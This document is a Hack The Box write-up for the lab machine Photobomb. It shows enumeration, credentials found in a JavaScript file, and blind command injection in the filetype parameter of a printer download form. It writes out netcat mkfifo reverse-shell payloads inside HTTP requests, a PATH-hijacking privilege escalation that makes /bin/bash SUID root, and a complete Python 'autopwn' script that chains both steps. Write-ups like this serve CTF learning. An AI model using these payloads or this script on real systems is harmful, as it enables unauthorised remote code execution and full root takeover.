---
title: Photobomb Writeup
author: ak3dv
date: 2023-02-10
categories: [Writeup, HTB]
tags: [Linux, CTF, Command Injection, PATH Hijacking]
image:
  path: ../../assets/img/commons/Photobomb/photobomb.png 
  width: 700
  height: 900
  alt: Banner Photobomb
---

We are going to solve an easy Linux machine from Hackthebox called Photobomb.

## Exploitation Guide for Photobomb

### Enumeration

```bash
# Nmap 7.92 scan initiated Sat Oct 15 11:05:40 2022 as: nmap -p22,80 -n -v -sCV -oN targeted 10.10.11.182
Nmap scan report for 10.10.11.182
Host is up (0.062s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 15 11:05:51 2022 -- 1 IP address (1 host up) scanned in 11.68 seconds
```

Within the nmap results we can see a domain `photobomb.htb`.
We can add it in the `/etc/hosts` file.

```bash
echo "10.10.11.182 photobomb.htb" | sudo tee -a /etc/hosts
```

### Web Enumeration

![Website](/assets/img/commons/Photobomb/page.png)

Looking at the source code, we find a `photobomb.js` file and a link to `/printer`.

```bash
<!DOCTYPE html>
<html>
<head>
  <title>Photobomb</title>
  <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
  <script src="photobomb.js"></script>
</head>
<body>
  <div id="container">
    <header>
      <h1><a href="/">Photobomb</a></h1>
    </header>
    <article>
      <h2>Welcome to your new Photobomb franchise!</h2>
      <p>You will soon be making an amazing income selling premium photographic gifts.</p>
      <p>This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.</p>
      <p>To get started, please <a href="/printer" class="creds">click here!</a> (the credentials are in your welcome pack).</p>
      <p>If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.</p>
    </article>
  </div>
</body>
</html>

```

Once we access the `printer` page, we find an authentication panel, trying default combinations we're not able to log in.

Looking at the `photobomb.js` we notice the credentials to access the panel: `pH0t0:b0Mb!`.

```bash
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;

```

After logging in we see an application that allows us to download images by specifying the format and size.

![Website](/assets/img/commons/Photobomb/printer.png)

Lets send the download request to burpsuite.

![Burp](/assets/img/commons/Photobomb/burp.png)

We can check in the response a parameter called `filename` with the final image after being processed with the format and size.

### Exploitation (Command injection)

With this in mind, we can think that the application is executing a command from the system to convert the image.

Trying command injection payloads on all the parameters, we see that the `filetype` parameter is vulnerable (`blind injection`).

```bash
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 93
Origin: http://photobomb.htb
DNT: 1
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1


photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png;ping+-c+1+10.10.16.5&dimensions=30x20
```

```bash
sudo tcpdump -i tun0 icmp
[sudo] contraseña para akera: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:21:32.645120 IP photobomb.htb > 10.10.16.5: ICMP echo request, id 2, seq 1, length 64
18:21:32.645180 IP 10.10.16.5 > photobomb.htb: ICMP echo reply, id 2, seq 1, length 64
```

#### Reverse Shell

Now we can a get a reverse shell using netcat: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f` (`change IP and PORT`).

Before we can execute the reverse shell we have to URL encode it.

```bash
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 93
Origin: http://photobomb.htb
DNT: 1
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png;rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.16.5+443+>/tmp/f&dimensions=30x20
```

And we receive a shell as `Wizard`.

```bash
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.182] 54526
/bin/sh: 0: can't access tty; job control turned off
$ whoami
wizard
$ 
```

#### Stty upgrade

```bash
$ script /dev/null -c bash
Script started, file is /dev/null
wizard@photobomb:~/photobomb$ ^Z
[1]  + 77712 suspended  nc -lvnp 443
❯ stty raw -echo; fg
[1]  + 77712 continued  nc -lvnp 443
                                    reset
reset: unknown terminal type unknown
Terminal type? xterm

wizard@photobomb:~/photobomb$ export TERM=xterm
wizard@photobomb:~/photobomb$ export SHELL=bash
wizard@photobomb:~/photobomb$ stty rows 45 cols 159
wizard@photobomb:~/photobomb$ 
```

### PRIV ESC (PATH Hijacking)

Looking at the sudoers permissions, our user is able to execute `/opt/cleanup.sh` as `root` without password while specifying the environmental variable.

```bash
wizard@photobomb:~/photobomb$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

Code of `/opt/cleanup.sh`.

```bash
wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

Analyzing the script, we observe that the `find` binary is getting executed without the absolute path `/usr/bin/find`.

Let's create a file called `find` in the `/tmp` directory with execute permissions:

```bash
wizard@photobomb:/tmp$ cat find 
#!/bin/bash

chmod u+s /bin/bash

wizard@photobomb:/tmp$ chmod +x find 
```

Now we can execute the script as root while we specify the `PATH` variable to `/tmp:$PATH`, this will execute the script but at the time that executes the `find` command it will search for the command in the `/tmp` directory following the `PATH` variable giving the bash SUID permissions.

```bash
wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
wizard@photobomb:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18 09:14 /bin/bash

wizard@photobomb:/tmp$ bash -p
bash-5.0# whoami
root
```

### AutoPWN

```bash
#!/usr/bin/python3

import requests
from pwn import *

# Ctrl + C
def def_handler(sig,frame):
	print("[!] Exiting")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

host = '10.10.14.4'
port = 443

def pwned():

    reverse_shell = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f'

    url = 'http://photobomb.htb/printer'

    headers = {
        'Authorization': 'Basic cEgwdDA6YjBNYiE='
    }

    form_data = {
        'photo': 'voicu-apostol-MWER49YaD-M-unsplash.jpg', 
        'filetype': f'jpg;{reverse_shell}', 
        'dimensions': '3000x200'
    }

    r = requests.post(url,headers=headers,data=form_data)

if __name__ == '__main__':

    p1 = log.progress("Photobomb autopwn")
    try:
        threading.Thread(target=pwned, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(port, timeout=20).wait_for_connection()
    p1.status("Obtained shell as Wizard") 
    sleep(2)
    p1.status("Trying to get a shell as root")
    sleep(2)
    shell.sendline(b"echo 'chmod u+s /bin/bash' > /tmp/find")
    shell.sendline(b"chmod +x /tmp/find")
    shell.sendline(b"sudo PATH=/tmp:$PATH /opt/cleanup.sh")
    shell.sendline(b"bash -p")
    p1.status("Obtained shell as root")
    shell.interactive()
```